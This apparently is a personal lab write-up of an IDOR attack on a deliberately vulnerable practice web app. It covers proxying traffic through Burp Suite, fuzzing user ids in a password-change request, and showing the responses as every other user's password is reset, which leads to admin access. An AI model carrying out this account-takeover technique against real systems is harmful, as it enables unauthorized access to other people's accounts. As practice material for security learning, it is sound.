Insecure Direct Object Reference


Register Portal
```
https://appazgoat13387130-function-app.azurewebsites.net/#/register
```
![[Pasted image 20240126144556.png]]
Login Portal
```
https://appazgoat13387130-function-app.azurewebsites.net/#/login

```
![[Pasted image 20240126144737.png]]
```
Dashboard
https://appazgoat13387130-function-app.azurewebsites.net/#/dashboard/app
```
![[Pasted image 20240126145245.png]]
```
https://appazgoat13387130-function-app.azurewebsites.net/#/dashboard/profile
```
![[Pasted image 20240126145839.png]]
---------------
wwwwwwwwwwwwwwwwwwwwwwwwww

```
Foxproxy setup to send all traffic to Burp Suite
```
![[Pasted image 20240126163231.png]]
```
Open Browser will launch Browser connected to Burpsuite
```
![[Pasted image 20240126163357.png]]
![[Pasted image 20240126163508.png]]

```
Intercet is on. refresh the page
```
![[Pasted image 20240126164123.png]]
![[Pasted image 20240126164222.png]]
```
Click on Intercept is on to turn off intercepting each requests
```
```
https://appazgoat13387130-function-app.azurewebsites.net/#/register
```
![[Pasted image 20240126164957.png]]
![[Pasted image 20240126165311.png]]
```
Register credentials interception request
```
![[Pasted image 20240126165413.png]]
```
login request
https://appazgoat13387130-function-app.azurewebsites.net/#/login
```
![[Pasted image 20240126165631.png]]
![[Pasted image 20240126165705.png]]
```
https://appazgoat13387130-function-app.azurewebsites.net/#/dashboard/app
```
```
After ckicking on profile. Open developer tools
```

![[Pasted image 20240126170120.png]]
![[Pasted image 20240126165921.png]]
```
Send request to intruder and then fuzz the id's to see if I can change the passwords of other users. My user ckent has id 10. SUpposedly there should be 9 other users
```
![[Pasted image 20240126170840.png]]

```
Clicking on the Add button while id is selected
```
![[Pasted image 20240126170959.png]]
```
To generate the number of ids in bash. In this instance is only 10 numbers but it could have been more

for i in {0..9}; do echo $i; done

0
1
2
3
4
5
6
7
8
9
                                  
```
![[Pasted image 20240126171450.png]]
```
un check URL-encode these characters under Payload encoding section
```

![[Pasted image 20240126171550.png]]
![[Pasted image 20240126172734.png]]
```
Users 1 to 9 have all had their passwords successfully changed
{"body": {"email": "johndoe@gmail.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "1", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "interdum.curabit@aol.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "2", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "tempor@icloud.net", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "3", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "tempus.risus@aol.net", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "4", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "orci.adipiscing@google.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "5", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "interdum.curabitur@aol.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "6", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "phasellus@aol.ca", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "7", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "test@test.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "8", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "bwayne@gmail.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "9", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}

```
```
I now have access to each account
johndoe@gmail.com
interdum.curabit@aol.com
tempor@icloud.net
tempus.risus@aol.net
orci.adipiscing@google.com
interdum.curabitur@aol.com
phasellus@aol.ca
test@test.com
bwayne@gmail.com
```
![[Pasted image 20240126173343.png]]
![[Pasted image 20240126173456.png]]

![[Pasted image 20240126173557.png]]```

```
I can now login as any user with their email and a password of "test"
with the exception of who
Interestingly enough the user, orci.adipiscing has been banned 
```
![[Pasted image 20240126173839.png]]![[Pasted image 20240126174353.png]]
```
The jwt token gives all the profile informaition about each user inclusing the name of the admin
```
![[Pasted image 20240126174649.png]]
![[Pasted image 20240126174907.png]]
```
My recent logins from my brute force attempt can be seen on the dashboard. As a regular user I can only see users. All the emails for each user is obscured/masked
```
![[Pasted image 20240126175409.png]]
```
Logging in as the admin account allows me to see all the infromation for each user
I can confirm that im using the admin account as I can reassign the author, delete user, unban user, and ban users
```
![[Pasted image 20240126175832.png]]
